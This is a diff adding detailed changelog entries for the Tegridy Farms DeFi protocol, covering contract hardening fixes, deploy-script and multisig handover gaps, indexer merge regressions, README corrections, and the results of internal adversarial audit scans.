+- **M17 — losing keepers paid for storage before being told they lost.** `TegridyTWAP.update` ran fee accounting and reserve reads before the `canUpdate(pair)` period check. The check moved to the front, so a contending keeper reverts early and loses only unused gas.
+- **Three LOW post-condition guards.** `TegridyDropV2.reveal` now rejects an empty `revealURI` — pre-fix `reveal("")` permanently bricked metadata, since the revealed flag is monotonic and `tokenURI` would return `""` forever; it mirrors the asymmetric `BaseURIEmpty` guard on `freezeBaseURI`. `TegridyNFTPool._settleRoyalty` gas-caps its `royaltyInfo` try-call at 50k (matching `SafeERC721Call.DEFAULT_OWNER_OF_GAS_BUDGET`), because a hostile collection burning 63/64 of forwarded gas reverted every swap out-of-gas. And `TegridyLending.sweepUnsolicitedNFT` gained a paired `safeOwnerOfBounded` post-condition: **the variable named `moved` was actually the call status `ok`, not evidence that anything moved**, so a collection whose `transferFrom` returned success without transferring went undetected. Canonical pattern taken from `_safeOutboundTransferStaking` at lines 1574-1586.
+
+### Fixed — the JBAC vault would have been unreachable the moment ownership moved to the multisig, and lending was in no deploy script at all (2026-05-16)
+
+[#26](https://github.com/fomotsar-commits/tegridy-farms/pull/26), `701239d9` — 10 files, +1,106/−58. Four wave-3 deploy-pipeline gaps plus further one-shot wire gaps found by a systematic sweep, alongside one live orderbook fix and the indexer and runbook work. **The deploy-pipeline half is the dangerous half: those defects fire once, at relaunch, and are not recoverable afterwards without a redeploy.**
+
+- **`staking.setJbacVault()` is owner-only and one-shot, and no script called it.** The vault contract and its one-shot wiring requirement were introduced by the EIP-170 sister-split recorded earlier in this file; nothing then wired it. `DeployFinal.s.sol` and `DeployAuditFixes.s.sol` now deploy `TegridyStakingJbacVault` and wire it *before* `transferOwnership(MULTISIG)`. Missing it leaves JBAC boost permanently unreachable after handover.
+- **Lending had been absent from every deploy script for months.** `DeployFinal.s.sol` gained an inline `TegridyLending` + `TegridyLendingAdmin` deploy with the `setLendingAdmin` wire and ownership transfer. Because `DeployAuditFixes` is already at the Yul stack-too-deep ceiling, the audit-fix redeploy path got its own broadcast instead: new `contracts/script/DeployLending.s.sol` and a `contracts/deploy-lending.sh` wrapper mirroring `deploy-vote-incentives.sh` (keystore-first signing, a `/dev/tty` confirmation gate, env-var validation). `deploy.sh`'s post-broadcast next-steps now point at it. **The scripts are written, not run** — this commit changes the relaunch procedure, it does not deploy anything.
+- **`Verify.s.sol` grew from a spot-check into a post-deploy invariant runner that fails loud before the operator announces the relaunch** — 199 added lines, and 58 lines of the file carry an `INV-` tag at that commit. INV-7 checks `staking.jbacVault`; INV-8a–d check that lending is deployed, `lendingAdmin` is wired, both are owned by MULTISIG and lending is not paused; INV-9a–k check pending-owner-transfer health across 11 contracts, which is what catches the 14-day `OwnableNoRenounce.OWNERSHIP_TRANSFER_EXPIRY` cliff where **the deployer EOA keeps ownership permanently if the multisig does not `acceptOwnership` in time**; INV-10a–h assert the one-shot wires that must be set post-handover (`staking.stakingAdmin`, `swapFeeRouter.swapFeeRouterAdmin`, `voteIncentives.gaugeController`, `voteIncentives.voteIncentivesAdmin`, `voteIncentives.restakingContract`, `communityGrants.restakingContract`, `memeBountyBoard.restakingContract`, `referralSplitter.restakingContract`); INV-11a checks the L2 sequencer feed on `SwapFeeRouter`, skipped on mainnet. The commit's subject line says "7 one-shot wire fixes" and its INV-10 note says "7 wave-3 finds", but it then enumerates **eight** names against eight assertions — eight is what the code checks.
+- **The orderbook's legacy fill fallback was removed rather than patched.** This closes the remainder of the monster-audit F10 finding recorded above: F10 replaced `topics[1]`-matching with a canonical Seaport order hash and added migration `005_add_seaport_order_hash.sql`, but left a fallback for rows predating it. Those rows could still be marked filled by presence-matching `topics[1]` (the indexed offerer) against the row's `maker` — the filler-signer was never bound to the order maker, so anyone who could observe *any* past Seaport sale by that maker could submit that transaction hash and mark an unrelated active listing filled. Legacy rows now reject the attempt with "Legacy listing without canonical order hash cannot be marked filled; please re-list", and their own 7-day TTL retires them.
+- **22 previously-unindexed business events entered the indexer surface** via new `POLAccumulatorBusinessAbi` / `PremiumAccessBusinessAbi` / `TegridyLendingAbi` blocks: POL accumulate/sweep/harvest, premium subscribe/cancel/shortfall, and the lending loan lifecycle. Handlers emit structured `console.log` traces for now, with typed DB rows deferred to a later PR. Two events are flagged for off-chain alerting: `PremiumAccess.RefundShorted` (contract balance insufficient for a refund) and `TegridyLending.CollateralStuck` (a whitelisted ERC-721 silently no-op'd `transferFrom` — alert and delist the collection). The lending address is env-driven via `TEGRIDY_LENDING_ADDRESS`, matching the existing admin-contract placeholders.
+- **`RELAUNCH_RUNBOOK.md` gained a section 1.5 recommending a MULTISIG/TREASURY split with disjoint signer sets** — a 4-of-7 cold MULTISIG against a 2-of-3 hot TREASURY. The stated reason: with a single multisig, one compromise loses privileged ownership *and* the treasury together, and Compound, Aave, Curve and Uniswap V3 all split the two. Section 3's wiring sequence went from 16 to 19 steps to cover the newly-found one-shot wires and the L2 sequencer feed; section 5 documents INV-7 through INV-11.
+
+### Fixed — merging #26 left the live lending contract unindexed and the indexer unable to boot (2026-05-16)
+
+[#27](https://github.com/fomotsar-commits/tegridy-farms/pull/27), `4e6887e4` — 62 insertions against 127 deletions, i.e. mostly a deletion. [#26](https://github.com/fomotsar-commits/tegridy-farms/pull/26) merged the wave-3 indexer additions onto a branch that already carried a `TegridyLending` subscription and handler set, and **the post-merge state did not surface the collision, so two regressions landed on trunk**.
+
+- **Two `TegridyLending` entries in the same JS object literal.** The object-literal merge silently kept only the last one — the newly-added env-driven address defaulting to `0x0` — so the live lending contract at `0xd471e5675EaDbD8C192A5dA2fF44372D5713367f` stopped being indexed with no error anywhere. The redundant second subscription was deleted; the canonical entry with the real deployed address (around line 1104) wins.
+- **Six duplicate `ponder.on()` handlers** for `LoanOfferCreated`, `LoanAccepted`, `LoanRepaid`, `DefaultClaimed`, `Paused` and `Unpaused`. Ponder rejects duplicate handlers at startup with a fatal error, so **the indexer would have refused to boot at all**. The six duplicates were deleted, keeping only the four new-event handlers, which attach to the canonical subscription.
+- **A CodeQL Autofix made the second problem invisible instead of fixing it.** `b999d733` — "Potential fix for pull request finding 'CodeQL / Assignment to constant'", committed on the #26 branch from a Copilot Autofix suggestion — resolved the duplicate declaration by renaming the added `TegridyLendingAbi` to `TegridyLendingAbiV2`. That one-line rename satisfied the analyser and left the new ABI orphaned, referenced by no subscription, so the new business events would have gone unindexed even without the handler crash. The orphaned block was deleted and its four new events (`LoanOfferCancelled`, `EscrowRewardsPaid`, `CollateralStuck`, `StuckCollateralClaimed`) merged into the pre-existing `TegridyLendingAbi` around line 390.
+
+### Changed — README rewritten for a cold auditor, then corrected twice inside the next twenty-three minutes (2026-05-13)
+
+Four commits between 09:27 and 09:50 on one morning, two of them correcting an earlier one in the same run. The stated target reader is a paid auditor, depositor or contributor landing cold.
+
+- **`987d722a`** added a "How it all fits together" section between "What it is" and "How to use it", carrying three Mermaid diagrams that GitHub renders inline: the revenue flywheel (every user surface — DEX, lending, NFT AMM, launchpad, premium — routing ETH fees through `SwapFeeRouter` → `RevenueDistributor` into one sink), the staking position as collateral (the `TegridyStaking` ERC-721 as the input to LP boost, gauge voting, referral qualification, lending collateral, restaking and revenue claims), and a governance sequence diagram routing bribes through Cartman's Market into the same reward stream, on the Curve/Aerodrome playbook. A "Why each surface exists" table maps every contract to its revenue-or-collateral role. It also refreshed three stale numbers: forge posture 1,933 → 2,593 passing across 149 suites, audit-derived test files 27+ → 40+, internal AI-agent sweeps 7 → 9+.
+- **`90abe84a`** added a "Contract count" subsection to stop a reviewer counting 30 `.sol` files and concluding the protocol has 30 independent things: **the five admin/vault sisters that look like duplicates are intentional EIP-170 splits** (Lending/Admin, Staking/Admin/JbacVault, SwapFeeRouter/Admin, VoteIncentives/Admin) sized to keep each main contract under the 24,576-byte limit. It also killed the stale repo-layout line reading "27 production contracts (staking, DEX, lending, gov, launchpad v1+v2)", noting zero V1 duplicates remain — the V1 `TegridyDrop` and `TegridyLaunchpad` sources were deleted on 2026-04-19.
+- **`482b34fc`**, three minutes later, corrected `90abe84a`'s own arithmetic: "21 user-facing primitives + 5 sisters" does not add to 30. Audited from `ls contracts/src/*.sol`: **30 root files minus 5 sisters is 25 user-facing primitives, not 21**, plus 6 utility files under `src/base/` (2) and `src/lib/` (4), for 36 `.sol` under `contracts/src/**`. Re-counted against the tree at that commit, all four figures hold — 30 root, 2 base, 4 lib, 36 total.
+- **`c78fe4d0`**, twelve minutes after that, was the accuracy overhaul, synthesised from three parallel review agents (factual, completeness, tone). Net +82/−70. Seven stated figures were revised against their source documents, including two that `987d722a` had set twenty-three minutes earlier: Toweli "audited 9 times" → "16 times across the full lineage"; frontend Vitest "70+" → 191/191 across 14 test files; repo layout "67 test suites, 1,933 tests" → 118 test files / 149 suites / 2,593 tests (+53 invariant); audit lineage "9+ internal AI-agent sweeps" → 14, to match `AUDITS.md`; audit-derived test files 40+ → 70+; frontend test surface "403+ unit tests + 20+ Playwright" → 191/191 vitest + 12 Playwright; and the archive's "9 earlier reviews" → 6. The audit table gained PASS5–PASS8 rows and a Monster Audit row.
+- **The Deployed Contracts section stopped presenting Wave 0 as canonical.** All 22 Wave 0 addresses moved into a single collapsed `<details>` block, explicitly marked historical and "do not interact assuming canonical", under a pre-relaunch banner pointing at `RELAUNCH_RUNBOOK.md` and `MIGRATION_HISTORY.md`. The roadmap dropped the obsolete Wave 0 broadcast items per the 2026-05-02 relaunch decision and replaced them with the three actual gates: multisig setup, a paid human audit, and the relaunch broadcast — with **multisig setup promoted out of a buried bullet and named as the biggest unresolved attack vector**. The same commit also adds an above-the-fold "real numbers, not vibes" callout reading "14 internal + 2 external audits". **That figure is the commit's own and nothing else in this slice corroborates it** — and it sits awkwardly beside the roadmap it ships with, which lists a paid human audit as a gate still ahead.
+
+### Security — scan7 and scan8 reached trunk: four dead branches deleted, one chain-id guard, zero exploitable findings (2026-05-12)
+
+Two merges landed the outstanding audit lineage on `mvp-launch` today; both carry branch work authored days earlier. `b5728e9c` brought in the six-commit monster-audit lineage from `claude/festive-hofstadter-92bccd` — **the work itself is already recorded below under "Monster Audit + adversarial sweep (2026-05-09 → 2026-05-10)", which dates the branch work and not the trunk landing; this is that landing date.** `79aae235` brought in scan7 (`37bb216`) and scan8 (`78f5987`) from `claude/musing-dhawan-912834`, both authored 2026-05-09 and neither of which had been in this file at all.
+
+**scan7** dispatched 4 parallel adversarial agents across the 25-contract surface (staking + restaking + lending / DEX + hook + TWAP + NFT pool / governance + revenue + grants / POL + fee routers + cross-contract). All four returned **0 exploitable findings** — the second consecutive scan confirming scan6's "asymptotic floor reached" verdict. Under the DELETE-before-ADD mandate it produced five deletion candidates, four applied:
+
+- **DC-1** — `TegridyNFTLending.acceptOffer`'s `offer.expiry != 0` shim, a carve-out for pre-M10 offers and dead since `createOffer` began enforcing `_expiry >= block.timestamp + MIN_OFFER_VALIDITY` (1h). Sibling-canonical with `TegridyLending.acceptOffer:1065`, which never had the shim. −1 LoC.
+- **DC-2 / DC-3** — the `treasuryAtCreate == address(0)` fallbacks in both lending siblings. Constructor and setter both enforce a non-zero treasury and `createOffer` always writes `treasuryAtCreate`, so the only source of a zero was pre-LD2-M3 offers, which do not survive the relaunch. −1 LoC each.
+- **DC-5** — `POLAccumulator`'s `BACKSTOP_PROPOSAL_VALIDITY`, `SLIPPAGE_PROPOSAL_VALIDITY` and `ACCUMULATE_CAP_PROPOSAL_VALIDITY`. **The comment claimed they were kept for test compatibility; a repo-wide grep found zero references.** Pure surface inflation, and publicly storage-readable. −3 LoC.
+- **DC-4 (deferred)** — `TegridyLending.repayLoan`'s `int16` negative-sentinel ternary is equally dead, but both the inline and local-variable forms of the deletion trip Yul stack-too-deep in `repayLoan` under `via_ir`, so it was kept with an explanatory comment per the "defer if the delete breaks the build" rule.
+
+Three further scan7 observations were recorded as non-issues **specifically because closing them would mean hardening-by-adding**: `ReferralSplitter`'s `MIN_REFERRAL_STAKE_POWER` live-read (economically defended by the 7-day `MIN_LOCK` and the 25% early-withdraw penalty, so flash-staking for one boolean is uneconomic), `TegridyFeeHook`'s `accruedFees`-versus-`PoolManager` drift (closed structurally by the 24h-timelocked, 7-day-cooldown, 10%-step sync from D-AMM-M4), and ETH-ingress counter overflow at 2^256, which the commit calls cosmic at 1e51× the ETH supply.
+
+**scan8** put one agent across 22 deploy scripts and sibling-contract storage drift; Slither was not installed and was skipped. Also 0 exploitable — a third consecutive zero after scan6 and scan7. One 1-line fix applied: **SE-1, a chain-id guard on `DeployToweli.s.sol`**, which had none, so an operator typing `--rpc-url $MAINNET_RPC` instead of the testnet one would have deployed a non-vanity TOWELI on mainnet and fragmented it from the canonical `0x420698CF…` vanity prefix. Post-fix: `require(block.chainid != 1, "USE_VANITY_DEPLOY_FOR_MAINNET")` — sibling-canonical with every other script's guard, just inverted from mainnet-only to mainnet-forbidden. Four stale-script deletion candidates were **deferred, not applied**, as operator pre-relaunch hygiene: `WireV2.s.sol` and `Verify.s.sol` (nine hardcoded legacy addresses each), `DeployTegridyRouter.s.sol` and `DeployVoteIncentives.s.sol`, with `DeployFinal.s.sol` flagged for awareness — each requires off-chain decisions (a new vanity token address, a new multisig, a new treasury) before any script edit is meaningful.
+
+After three zero-finding scans, the commit records the in-house adversarial budget as saturated and names the next escalation as a paid firm.
 
 ### Security — Monster Audit + adversarial sweep (2026-05-09 → 2026-05-10)
 
